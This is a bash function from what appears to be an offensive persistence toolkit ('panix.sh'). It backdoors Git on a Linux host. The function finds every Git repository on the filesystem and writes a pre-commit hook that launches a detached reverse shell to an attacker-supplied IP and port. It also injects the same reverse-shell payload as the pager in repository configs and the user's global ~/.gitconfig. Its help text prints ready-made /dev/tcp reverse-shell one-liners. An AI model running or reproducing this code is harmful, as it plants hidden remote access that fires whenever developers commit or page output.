setup_git_persistence() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local hook=0
	local pager=0
	local path=""
	local command=""

	usage_git() {
		echo "Usage: ./panix.sh --git [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--custom 				       Use custom Git settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --path <path>                Specify custom path"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--hook )
				hook=1
				;;
			--pager )
				pager=1
				;;
			--path )
				shift
				path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
				echo ""
				echo "--custom:"
				echo "./panix.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
				echo ""
				echo "./panix.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
				exit 0
				;;
			--help|-h)
				usage_git
				exit 0
				;;
			* )
				echo "Invalid option for --git: $1"
				echo "Try './panix.sh --git --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: --default or --custom must be specified."
		echo "Try './panix.sh --git --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

	# Function to add malicious pre-commit hook
	add_malicious_pre_commit() {
		local git_repo="$1"
		local pre_commit_file="$git_repo/.git/hooks/pre-commit"

		if [[ ! -f $pre_commit_file ]]; then
			echo "#!/bin/bash" > $pre_commit_file
			echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
			chmod +x $pre_commit_file
			echo "[+] Created malicious pre-commit hook in $git_repo"
		else
			echo "[-] Pre-commit hook already exists in $git_repo"
		fi
	}

	# Function to add malicious pager configuration
	add_malicious_pager() {
		local git_repo="$1"
		local git_config="$git_repo/.git/config"
		local user_git_config="$HOME/.gitconfig"

		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"

		if [[ ! -f $git_config ]]; then
			mkdir -p $git_repo/.git
			echo "[core]" > $git_config
			echo "        pager = $payload" >> $git_config
			echo "[+] Created Git config with malicious pager in $git_repo"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $git_config; then
				echo "[core]" >> $git_config
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
			echo "[+] Updated existing Git config with malicious pager in $git_repo"
		fi

		# Add to user's global config if it doesn't exist
		if [[ ! -f $user_git_config ]]; then
			echo "[core]" > $user_git_config
			echo "        pager = $payload" >> $user_git_config
			echo "[+] Created global Git config with malicious pager"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $user_git_config; then
				echo "[core]" >> $user_git_config
			fi
			# Add pager configuration under [core] section in global config
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
			echo "[+] Updated existing global Git config with malicious pager"
		fi
	}

	# Function to add custom pre-commit hook
	add_custom_pre_commit() {
		if [[ ! -f $path ]]; then
			echo "#!/bin/sh" > $path
			echo "$command" >> $path
			chmod +x $path
			echo "[+] Created custom pre-commit hook in $path"
		else
			echo "[-] Pre-commit hook already exists in $path"
		fi
	}

	# Function to add custom pager configuration
	add_custom_pager() {
		local payload="$command"

		if [[ ! -f $path ]]; then
			echo "[core]" > $path
			echo "        pager = $payload" >> $path
			echo "[+] Created custom Git config with pager in $path"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $path; then
				echo "[core]" >> $path
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
			echo "[+] Updated existing Git config with custom pager in $path"
		fi
	}

	# Function to find Git repositories and apply chosen options
	find_git_repositories() {
		local repos=$(find / -name ".git" -type d 2>/dev/null)

		if [[ -z $repos ]]; then
			echo "[-] No Git repositories found."
		else
			for repo in $repos; do
				local git_repo=$(dirname $repo)
				if [[ $hook -eq 1 ]]; then
					add_malicious_pre_commit $git_repo
				fi
				if [[ $pager -eq 1 ]]; then
					add_malicious_pager $git_repo
				fi
			done
		fi
	}

	# Execute based on mode (default or custom)
	if [[ $default -eq 1 ]]; then
		find_git_repositories
	elif [[ $custom -eq 1 ]]; then
		if [[ $hook -eq 1 ]]; then
			add_custom_pre_commit
		elif [[ $pager -eq 1 ]]; then
			add_custom_pager
		fi
	fi
	echo "[+] Git persistence established!"
}
